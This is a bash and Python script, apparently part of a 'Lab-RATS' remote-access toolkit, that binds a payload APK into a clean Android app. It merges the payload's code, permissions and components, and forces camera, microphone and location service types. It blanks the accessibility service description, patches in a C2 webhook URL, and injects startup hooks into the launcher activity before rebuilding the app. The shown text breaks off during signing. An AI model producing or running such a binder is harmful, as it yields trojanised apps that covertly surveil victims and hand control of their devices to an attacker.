#!/bin/bash

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌───────────────────────────────────────────────────────────────────────┐"
    echo " │                                  .-         .                         │"
    echo " │                               ....-        :                          │"
    echo " │                            -==--+:.+. ..  -..+:-+                     │"
    echo " │                            ++---:+.-==+==#:.+---+#                    │"
    echo " │                             :=---:+++++=++=**-:-:                     │"
    echo " │                               --+++:-=+++++++-=                       │"
    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
    echo " │                   --------=--:=:-:-====+++-                           │"
    echo " │                       .--++++--++:+++==:=+.                           │"
    echo " │                        .:+++::::--:..:-+=                             │"
    echo " │                       .--=+=-+-+    -:---*---                         │"
    echo " │                                                                       │"
    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"
    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"
    echo " │                                                                       │"
    echo " │     Smali Surgery & APK Binding Script (Unix) | v1.6.0 Hardened       │"
    echo " │                                                                       │"
    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
    echo " │                         DEVELOPED BY K4N3CO                           │"
    echo " │                               © 2026                                  │"
    echo " └───────────────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WORK_DIR="$SCRIPT_DIR/temp_binder"
OUTPUT_DIR="$PROJECT_DIR/bind_output"
TOOLS_DIR="$SCRIPT_DIR/tools"

mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output" "$TOOLS_DIR"

echo -e "${CYAN}"
echo " ┌───────────────────────────────────────────────────────────────────────┐"
echo " │               Lab-RATS Smali Surgery & APK Binder                    │"
echo " └───────────────────────────────────────────────────────────────────────┘"
echo -e "${NC}"

# 1. Target APK
if [ -z "$1" ]; then
    read -p "    Enter path to target clean APK: " TARGET_APK
else
    TARGET_APK="$1"
fi

if [ ! -f "$TARGET_APK" ]; then
    echo -e "${RED}[!] Target APK file not found: $TARGET_APK${NC}"
    exit 1
fi

TARGET_APK_DIR="$(cd "$(dirname "$TARGET_APK")" && pwd)"
TARGET_APK_NAME="$(basename "$TARGET_APK")"
TARGET_APK_ABS="$TARGET_APK_DIR/$TARGET_APK_NAME"

# 2. Payload APK
PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
if [ ! -f "$PAYLOAD_APK" ]; then
    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
fi

if [ ! -f "$PAYLOAD_APK" ]; then
    echo -e "${YELLOW}[!] Payload APK (signed_v1.apk) not found. Building release payload now...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew
    ./gradlew assembleRelease --no-daemon
    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
        PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
    else
        echo -e "${RED}[!] Payload APK compilation failed.${NC}"
        exit 1
    fi
    cd "$SCRIPT_DIR"
fi

# 3. Detect / Download Apktool
APKTOOL_CMD=""
if command -v apktool &> /dev/null; then
    APKTOOL_CMD="apktool"
elif [ -f "$TOOLS_DIR/apktool.jar" ]; then
    APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
else
    echo -e "${YELLOW}[!] apktool not found on system PATH. Downloading apktool.jar...${NC}"
    curl -sL -o "$TOOLS_DIR/apktool.jar" "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
    if [ -f "$TOOLS_DIR/apktool.jar" ]; then
        echo -e "${GREEN}[✓] Downloaded apktool.jar${NC}"
        APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
    else
        echo -e "${RED}[!] Failed to download apktool.jar. Please install apktool.${NC}"
        exit 1
    fi
fi

# Clean previous working dir
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"

PAYLOAD_DIR="$WORK_DIR/payload"
TARGET_DIR="$WORK_DIR/target"

# 4. Decompile APKs
echo -e "${CYAN}[*] Decompiling payload APK...${NC}"
$APKTOOL_CMD d -f -o "$PAYLOAD_DIR" "$PAYLOAD_APK"

if [ ! -d "$PAYLOAD_DIR" ]; then
    echo -e "${RED}[!] Payload APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# Check if Target APK is an XAPK / APKM / APKS zip bundle containing base.apk
BUNDLE_EXTRACT_DIR="$WORK_DIR/bundle_extracted"
python3 - "$TARGET_APK_ABS" "$BUNDLE_EXTRACT_DIR" << 'EOF'
import sys, os, zipfile

apk_path = sys.argv[1]
extract_dir = sys.argv[2]

if zipfile.is_zipfile(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            names = z.namelist()
            if "base.apk" in names:
                print(f"[!] Target {os.path.basename(apk_path)} is an XAPK/APKM App Bundle container. Extracting base.apk...")
                os.makedirs(extract_dir, exist_ok=True)
                z.extractall(extract_dir)
                base_path = os.path.join(extract_dir, "base.apk")
                if os.path.exists(base_path):
                    with open(os.path.join(extract_dir, "extracted_base.txt"), "w") as f_out:
                        f_out.write(base_path)
    except Exception as e:
        print(f"Bundle extract notice: {e}")
EOF

if [ -f "$BUNDLE_EXTRACT_DIR/extracted_base.txt" ]; then
    EXTRACTED_BASE=$(cat "$BUNDLE_EXTRACT_DIR/extracted_base.txt")
    if [ -f "$EXTRACTED_BASE" ]; then
        TARGET_APK_ABS="$EXTRACTED_BASE"
        echo -e "${GREEN}[✓] Extracted standalone base.apk from App Bundle container.${NC}"
    fi
fi

echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
$APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"

if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
    echo -e "${YELLOW}[!] Standard decompilation failed. Retrying with resource-preservation (-r)...${NC}"
    rm -rf "$TARGET_DIR"
    $APKTOOL_CMD d -f -r -o "$TARGET_DIR" "$TARGET_APK_ABS"
fi

if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
    echo -e "${RED}[!] Target APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# 5. Merge Smali Classes & Assets
echo -e "${CYAN}[*] Merging Smali bytecode and assets...${NC}"

# Find max smali_classes folder in target
MAX_IDX=1
for d in "$TARGET_DIR"/smali_classes*; do
    if [ -d "$d" ]; then
        NUM=$(echo "$d" | grep -o '[0-9]\+')
        if [ -n "$NUM" ] && [ "$NUM" -gt "$MAX_IDX" ]; then
            MAX_IDX=$NUM
        fi
    fi
done

NEXT_IDX=$((MAX_IDX + 1))
DEST_SMALI="$TARGET_DIR/smali_classes$NEXT_IDX"
mkdir -p "$DEST_SMALI"

# Copy com/labs/labrats and dependencies from payload to target smali_classesN
for ps in "$PAYLOAD_DIR"/smali*; do
    if [ -d "$ps" ]; then
        cp -rn "$ps"/* "$DEST_SMALI/" 2>/dev/null || true
    fi
done

# Copy Assets
if [ -d "$PAYLOAD_DIR/assets" ]; then
    mkdir -p "$TARGET_DIR/assets"
    cp -rn "$PAYLOAD_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
fi

# Copy native libs if present
if [ -d "$PAYLOAD_DIR/lib" ]; then
    mkdir -p "$TARGET_DIR/lib"
    cp -rn "$PAYLOAD_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
fi

# Decompile and merge any split config APKs in target folder
TARGET_FOLDER=$(dirname "$TARGET_APK_ABS")
for split_apk in "$TARGET_FOLDER"/*config*.apk "$TARGET_FOLDER"/*split*.apk; do
    if [ -f "$split_apk" ] && [ "$split_apk" != "$TARGET_APK_ABS" ]; then
        echo -e "${CYAN}[*] Merging split APK resources from $(basename "$split_apk")...${NC}"
        SPLIT_DIR="$WORK_DIR/split_tmp"
        mkdir -p "$SPLIT_DIR"
        $APKTOOL_CMD d -f -o "$SPLIT_DIR" "$split_apk" 2>/dev/null || true
        [ -d "$SPLIT_DIR/lib" ] && cp -rn "$SPLIT_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/assets" ] && cp -rn "$SPLIT_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/res" ] && cp -rn "$SPLIT_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
        rm -rf "$SPLIT_DIR"
    fi
done

# Copy All Payload Resources (drawables, mipmaps, values, layouts, styles) into target/res/
if [ -d "$PAYLOAD_DIR/res" ]; then
    echo -e "${CYAN}[*] Merging payload resources into target res directory...${NC}"
    mkdir -p "$TARGET_DIR/res"
    python3 - "$PAYLOAD_DIR/res" "$TARGET_DIR/res" << 'EOF'
import sys, os, shutil

payload_res, target_res = sys.argv[1], sys.argv[2]
if os.path.exists(payload_res):
    os.makedirs(target_res, exist_ok=True)
    skip_bases = {"ic_launcher", "ic_launcher_round", "ic_launcher_foreground", "ic_launcher_background"}
    for root, dirs, files in os.walk(payload_res):
        rel = os.path.relpath(root, payload_res)
        dst_root = os.path.join(target_res, rel)
        os.makedirs(dst_root, exist_ok=True)

        existing_bases = set()
        if os.path.exists(dst_root):
            for existing_f in os.listdir(dst_root):
                ebase, _ = os.path.splitext(existing_f)
                existing_bases.add(ebase.lower())

        for f in files:
            sf = os.path.join(root, f)
            df = os.path.join(dst_root, f)
            f_base, _ = os.path.splitext(f)
            f_base_lower = f_base.lower()

            if f_base_lower in skip_bases or f_base_lower in existing_bases:
                continue

            if not os.path.exists(df):
                shutil.copy2(sf, df)
                existing_bases.add(f_base_lower)
EOF
    if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
        sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
        rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
    fi
fi

echo -e "${GREEN}[✓] Smali classes and assets merged.${NC}"

# C2 Webhook URL Configuration
EXISTING_WEBHOOK=""
if [ -f "$PROJECT_DIR/local.properties" ]; then
    EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
fi

echo -e "\n${CYAN}[*] Configuring C2 Webhook URL for Bound Target...${NC}"
if [ -n "$EXISTING_WEBHOOK" ]; then
    echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
    read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
    WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
else
    read -p "    Enter C2 Webhook URL (e.g. https://lab-rats-c2.onrender.com): " WEB_URL
fi

if [ -n "$WEB_URL" ]; then
    echo -e "${CYAN}[*] Patching C2 Webhook URL into bound smali classes...${NC}"
    WEB_URL_CLEAN="$(echo "$WEB_URL" | sed 's|/$||')"
    python3 - "$TARGET_DIR" "$WEB_URL_CLEAN" << 'EOF'
import sys, os, re

target_dir, web_url = sys.argv[1], sys.argv[2]
url_pattern = re.compile(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*')

count = 0
for root, _, files in os.walk(target_dir):
    for f in files:
        if f.endswith(".smali"):
            sf = os.path.join(root, f)
            try:
                with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
                    content = sfile.read()

                if "onrender.com" in content or "WEBHOOK_URL" in content or "http://" in content or "https://" in content:
                    new_content = url_pattern.sub(web_url, content)
                    new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url + r'\2', new_content)

                    if new_content != content:
                        with open(sf, 'w', encoding='utf-8') as sfile:
                            sfile.write(new_content)
                        count += 1
            except Exception:
                pass
EOF
    echo -e "${GREEN}[✓] C2 Webhook URL configured: $WEB_URL_CLEAN${NC}"
fi

# 6. AndroidManifest Surgery
echo -e "${CYAN}[*] Performing AndroidManifest.xml surgery...${NC}"

TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"
PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" 2>/dev/null | head -n1 | cut -d'"' -f2)
[ -z "$PKG_NAME" ] && PKG_NAME="com.target.app"

# Extract permissions from payload
grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
    PERM_NAME=$(echo "$perm" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
    if [ -n "$PERM_NAME" ] && ! grep -q "$PERM_NAME" "$TARGET_MANIFEST"; then
        sed -i.bak "s|<application|    $perm\n    <application|1" "$TARGET_MANIFEST"
    fi
done

# Perform 100% valid XML manifest surgery via Python ElementTree
python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" "$PKG_NAME" "$PAYLOAD_DIR" "$TARGET_DIR" << 'EOF'
import sys, os, re, xml.etree.ElementTree as ET

payload_path, target_path, target_pkg, payload_dir, target_dir = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
if not target_pkg:
    try:
        t_root = ET.parse(target_path).getroot()
        target_pkg = t_root.attrib.get('package', 'com.target.app')
    except Exception:
        target_pkg = "com.target.app"
ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')

try:
    # 1. Merge values/*.xml (styles, colors, strings) from payload to target
    payload_values = os.path.join(payload_dir, "res", "values")
    target_values = os.path.join(target_dir, "res", "values")
    if os.path.exists(payload_values) and os.path.exists(target_values):
        for xml_file in ["styles.xml", "colors.xml", "strings.xml", "drawables.xml"]:
            p_xml = os.path.join(payload_values, xml_file)
            t_xml = os.path.join(target_values, xml_file)
            if os.path.exists(p_xml) and os.path.exists(t_xml):
                try:
                    p_tree = ET.parse(p_xml)
                    t_tree = ET.parse(t_xml)
                    p_root = p_tree.getroot()
                    t_root = t_tree.getroot()
                    existing_names = {c.attrib.get('name') for c in t_root if c.attrib.get('name')}
                    added = False
                    for elem in p_root:
                        name = elem.attrib.get('name')
                        if name and name not in existing_names:
                            t_root.append(elem)
                            existing_names.add(name)
                            added = True
                    if added:
                        t_tree.write(t_xml, encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    print(f"Values merge notice for {xml_file}: {e}")

    payload_root = ET.parse(payload_path).getroot()
    payload_app = payload_root.find('application')

    # Strip split APK requirements so target installs as a single standalone APK
    target_tree = ET.parse(target_path)
    target_root = target_tree.getroot()
    if '{http://schemas.android.com/apk/res/android}isSplitRequired' in target_root.attrib:
        del target_root.attrib['{http://schemas.android.com/apk/res/android}isSplitRequired']

    target_app_elem = target_root.find('application')
    if target_app_elem is not None:
        for meta in list(target_app_elem.findall('meta-data')):
            meta_name = meta.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
            if 'com.android.vending.splits' in meta_name or 'com.android.vending.derived' in meta_name:
                target_app_elem.remove(meta)

    target_tree.write(target_path, encoding='utf-8', xml_declaration=True)

    with open(target_path, 'r', encoding='utf-8') as f:
        target_xml = f.read()

    if payload_app is not None:
        injections = []
        for elem in payload_app:
            name = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
            if name.startswith('.'):
                name = 'com.labs.labrats' + name
                elem.set('{http://schemas.android.com/apk/res/android}name', name)

            # Sanitize Provider authorities so bound app never conflicts with installed apps
            auth = elem.attrib.get('{http://schemas.android.com/apk/res/android}authorities', '')
            if auth:
                new_auth = auth.replace('com.android.system.stability', target_pkg).replace('com.labs.labrats', target_pkg)
                elem.set('{http://schemas.android.com/apk/res/android}authorities', new_auth)

            if 'com.labs.labrats' in name and name not in target_xml:
                elem_str = ET.tostring(elem, encoding='utf-8').decode('utf-8')
                injections.append(elem_str)

        if injections:
            injection_block = "\n    " + "\n    ".join(injections) + "\n</application>"
            target_xml = target_xml.replace("</application>", injection_block, 1)

        target_xml = target_xml.replace("com.android.system.stability", target_pkg).replace("com.labs.labrats.fileprovider", target_pkg + ".fileprovider")

        # Sanitize decompiled hex foregroundServiceType flags (e.g. 0x40000009 -> dataSync|location|specialUse)
        hex_map = {
            '0x40000009': 'dataSync|location|specialUse',
            '0x40000001': 'dataSync|specialUse',
            '0x40000000': 'specialUse',
            '0x00000001': 'dataSync',
            '0x00000008': 'location',
            '0x00000040': 'camera',
            '0x00000080': 'microphone',
            '0x00000020': 'mediaProjection'
        }
        for hex_val, flag_str in hex_map.items():
            target_xml = target_xml.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')

        target_xml = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', target_xml)

        with open(target_path, 'w', encoding='utf-8') as f:
            f.write(target_xml)
except Exception as e:
    print(f"Manifest Surgery Error: {e}")
EOF

rm -f "$TARGET_MANIFEST.bak"
echo -e "${GREEN}[✓] Manifest surgery completed.${NC}"

# Sanitize target resources (Repair corrupt PNG signatures in pure Bash without Python)
if [ -d "$TARGET_DIR/res" ]; then
    echo -e "${CYAN}[*] Sanitizing target resources & PNG signatures...${NC}"
    VALID_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
    VALID_NINE_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAMAAAADCAYAAABWKLW/AAAADElEQVR42mNkYGBgAAAABQABXvMqOAAAAABJRU5ErkJggg=="

    find "$TARGET_DIR/res" -type f \( -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" \) 2>/dev/null | while read -r img_file; do
        HEX_HEADER=$(hexdump -n 4 -e '1/1 "%02x"' "$img_file" 2>/dev/null || xxd -l 4 -p "$img_file" 2>/dev/null)
        if [[ "$HEX_HEADER" != "89504e47" ]]; then
            echo -e "${YELLOW}    [!] Repairing corrupt image signature: $(basename "$img_file")${NC}"
            if [[ "$img_file" == *".9.png" ]]; then
                echo "$VALID_NINE_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_NINE_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            else
                echo "$VALID_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            fi
        fi
    done
fi

# 7 & 8. Identify & Inject Smali Hooks into Application Class & Launcher Activity
echo -e "${CYAN}[*] Injecting Lab-RATS startup hooks into Application class & Launcher Activity...${NC}"

python3 - "$TARGET_DIR" << 'EOF'
import sys, os, re, xml.etree.ElementTree as ET

target_dir = sys.argv[1]
manifest_path = os.path.join(target_dir, "AndroidManifest.xml")

if not os.path.exists(manifest_path):
    sys.exit(1)

try:
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    package_name = root.attrib.get('package', '')
    app_elem = root.find('application')

    classes_to_hook = []

    # 1. Custom Application class or set fallback
    if app_elem is not None:
        app_name = app_elem.attrib.get('{http://schemas.android.com/apk/res/android}name')
        if app_name:
            if app_name.startswith('.'):
                app_name = package_name + app_name
            elif '.' not in app_name:
                app_name = package_name + '.' + app_name
            classes_to_hook.append(app_name)
        else:
            # Set fallback Application class to LabRatsApp
            with open(manifest_path, 'r', encoding='utf-8') as f:
                m_content = f.read()
            if '<application' in m_content and 'android:name=' not in m_content.split('<application')[1].split('>')[0]:
                m_content = m_content.replace('<application', '<application android:name="com.labs.labrats.LabRatsApp"', 1)
                with open(manifest_path, 'w', encoding='utf-8') as f:
                    f.write(m_content)
                print("[✓] Set fallback Application class to com.labs.labrats.LabRatsApp")

    # 2. Find Launcher Activity
    if app_elem is not None:
        for act in app_elem.findall('activity') + app_elem.findall('activity-alias'):
            for intent in act.findall('intent-filter'):
                has_main = False
                has_launcher = False
                for action in intent.findall('action'):
                    if action.attrib.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                        has_main = True
                for cat in intent.findall('category'):
                    if cat.attrib.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.category.LAUNCHER':
                        has_launcher = True

                if has_main and has_launcher:
                    act_name = act.attrib.get('{http://schemas.android.com/apk/res/android}name')
                    if act_name:
                        if act_name.startswith('.'):
                            act_name = package_name + act_name
                        elif '.' not in act_name:
                            act_name = package_name + '.' + act_name

                        # Resolve activity-alias targetActivity
                        for alias in app_elem.findall('activity-alias'):
                            alias_name = alias.attrib.get('{http://schemas.android.com/apk/res/android}name')
                            if alias_name and (alias_name == act_name or alias_name.endswith('.' + act_name.split('.')[-1])):
                                target_act = alias.attrib.get('{http://schemas.android.com/apk/res/android}targetActivity')
                                if target_act:
                                    if target_act.startswith('.'):
                                        target_act = package_name + target_act
                                    elif '.' not in target_act:
                                        target_act = package_name + '.' + target_act
                                    act_name = target_act
                                    break

                        classes_to_hook.append(act_name)
                        break

    hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"

    for cls in set(classes_to_hook):
        cls_rel_path = cls.replace('.', '/') + ".smali"
        smali_file = None

        for r, _, files in os.walk(target_dir):
            if "smali" in r:
                p = os.path.join(r, cls_rel_path)
                if os.path.exists(p):
                    smali_file = p
                    break

        if not smali_file:
            bn = os.path.basename(cls_rel_path)
            for r, _, files in os.walk(target_dir):
                if bn in files:
                    smali_file = os.path.join(r, bn)
                    break

        if smali_file and os.path.exists(smali_file):
            with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            if "Lcom/labs/labrats/LabRatsWorker;->init" in content:
                print(f"[✓] {cls} is already hooked.")
                continue

            modified = False
            if "onCreate(" in content:
                def reg_replacer(match):
                    header = match.group(1)
                    body = match.group(2)
                    reg_match = re.search(r'\.registers\s+(\d+)', header)
                    if reg_match:
                        reg_count = int(reg_match.group(1))
                        if reg_count < 2:
                            header = header.replace(f".registers {reg_count}", ".registers 2")
                    return header + body + hook_code

                pattern = r'(\.method\s+[^I]*onCreate\([^\n]*\n.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
                if re.search(pattern, content, re.DOTALL):
                    content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
                    modified = True
                else:
                    content = re.sub(r'(\.method\s+[^I]*onCreate\([^\n]*\n)', r'\1' + hook_code, content, count=1)
                    modified = True
            elif "attachBaseContext(" in content:
                content = re.sub(r'(\.method\s+[^I]*attachBaseContext\([^\n]*\n)', r'\1' + hook_code, content, count=1)
                modified = True
            else:
                new_on_create = (
                    "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
                    "    .registers 2\n"
                    "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n"
                    + hook_code +
                    "    return-void\n"
                    ".end method\n\n"
                )
                if ".end class" in content:
                    content = content.replace(".end class", new_on_create + ".end class")
                    modified = True

            if modified:
                with open(smali_file, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(f"[✓] Injected Lab-RATS startup hook into {cls}")
except Exception as e:
    print(f"Hooking Error: {e}")
EOF

echo -e "${GREEN}[✓] Smali hooks injected into Application and Launcher classes.${NC}"

# Detect native Android SDK aapt / aapt2 binaries (prefer stable 30-34 aapt v1 to prevent AAPT2 exit code 138)
AAPT1_BIN=""
AAPT2_BIN=""

if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
    STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
    if [ -z "$STABLE_BT" ]; then
        STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
    fi
    if [ -n "$STABLE_BT" ]; then
        [ -f "$STABLE_BT/aapt" ] && AAPT1_BIN="$STABLE_BT/aapt"
        [ -f "$STABLE_BT/aapt2" ] && AAPT2_BIN="$STABLE_BT/aapt2"
    fi
elif command -v aapt &> /dev/null; then
    AAPT1_BIN="$(command -v aapt)"
elif command -v aapt2 &> /dev/null; then
    AAPT2_BIN="$(command -v aapt2)"
fi

# Sanitize APKTOOL_DUMMY & invalid $ filenames/references in decompiled res/
if [ -d "$TARGET_DIR/res" ]; then
    echo -e "${CYAN}[*] Sanitizing AAPT2 invalid resource names (\$) & APKTOOL_DUMMY entries...${NC}"
    python3 - "$TARGET_DIR/res" << 'EOF'
import sys, os

res_dir = sys.argv[1]

# 1. Rename files starting with $ in res/
for root, _, files in os.walk(res_dir):
    for f in files:
        if f.startswith("$"):
            new_f = f.lstrip("$")
            old_path = os.path.join(root, f)
            new_path = os.path.join(root, new_f)
            try:
                os.rename(old_path, new_path)
            except Exception:
                pass

# 2. Clean APKTOOL_DUMMY, $ references, and private framework resource references (@android: -> @*android:)
for root, _, files in os.walk(res_dir, topdown=False):
    for file in files:
        if file.endswith(".xml"):
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                # Remove auto-generated API-versioned colors.xml (values-v34/colors.xml, etc.) containing private framework aliases
                if ("colors" in file and "values-v" in root) or ("colors" in file and ("bright_foreground" in content or "btn_default_material" in content or "accent_device" in content or "background_floating" in content)):
                    os.remove(file_path)
                    continue

                lines = content.splitlines()
                new_lines = []
                modified = False
                for line in lines:
                    if "APKTOOL_DUMMY" in line:
                        modified = True
                        continue

                    # 1. Strip <color> or <item> tags pointing to framework colors
                    if ("<color" in line or "<item" in line) and ("android:color/" in line or "bright_foreground" in line or "btn_default" in line or "accent_device" in line or "background_floating" in line or "background_material" in line or "car_blue" in line or "GM2_grey" in line):
                        modified = True
                        continue

                    # 2. Strip <item>, <color>, <dimen>, or <drawable> tags whose inner value points to a framework resource
                    if ("<item" in line or "<color" in line or "<dimen" in line or "<drawable" in line) and re.search(r'>\s*@\*?android:[^<]+<', line):
                        modified = True
                        continue

                    if "$" in line:
                        line = line.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
                        modified = True

                    if "@android:" in line:
                        line = line.replace("@android:color/", "@*android:color/").replace("@android:style/", "@*android:style/").replace("@android:attr/", "@*android:attr/").replace("@android:dimen/", "@*android:dimen/").replace("@android:drawable/", "@*android:drawable/").replace("@android:string/", "@*android:string/").replace("@android:", "@*android:")
                        modified = True

                    new_lines.append(line)

                if modified:
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write("\n".join(new_lines))
            except Exception:
                pass
EOF
    echo -e "${GREEN}[✓] Target resources sanitized for AAPT2 compatibility.${NC}"
fi

# 9. Recompile & Sign
echo -e "${CYAN}[*] Rebuilding bound APK...${NC}"
UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"

# Attempt 1: Rebuild with stable AAPT2 (34.0.0)
if [ -n "$AAPT2_BIN" ]; then
    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
else
    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
fi

if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${RED}[!] Rebuilding bound APK failed. Check apktool / aapt2 logs above.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# Auto-detect zipalign & apksigner from Android SDK build-tools if not in PATH
ZIPALIGN_CMD="zipalign"
if ! command -v zipalign &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/zipalign" ]; then
        ZIPALIGN_CMD="$STABLE_BT/zipalign"
    fi
fi

APKSIGNER_CMD="apksigner"
if ! command -v apksigner &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/apksigner" ]; then
        APKSIGNER_CMD="$STABLE_BT/apksigner"
    fi
fi

# Strip old target signatures from unsigned APK before alignment and apksigner to prevent inconsistent signature errors
if command -v zip &> /dev/null; then
    zip -d "$UNSIGNED_APK" "META-INF/*" 2>/dev/null || true
fi

echo -e "${CYAN}[*] Aligning & Signing bound APK...${NC}"
if command -v "$ZIPALIGN_CMD" &> /dev/null || [ -f "$ZIPALIGN_CMD" ]; then
    "$ZIPALIGN_CMD" -p -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
else
